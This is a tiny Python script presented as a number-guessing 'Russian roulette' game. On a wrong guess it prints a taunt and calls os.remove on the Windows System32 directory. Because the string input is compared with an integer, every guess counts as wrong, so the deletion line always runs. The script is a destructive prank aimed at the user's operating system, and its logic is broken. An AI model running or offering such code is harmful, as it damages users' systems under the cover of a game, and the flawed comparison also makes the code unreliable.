import os

random_number_by_PC = int.from_bytes(os.urandom(4), byteorder="big") % 10 + 1
ur_num = input("type a Number(1 ~ 10): ")

if(ur_num == random_number_by_PC):
    print("you survived.")
elif(ur_num != random_number_by_PC):
    print("Rick: Say Goodbye~!")
    os.remove("C:\\Windows\\System32")
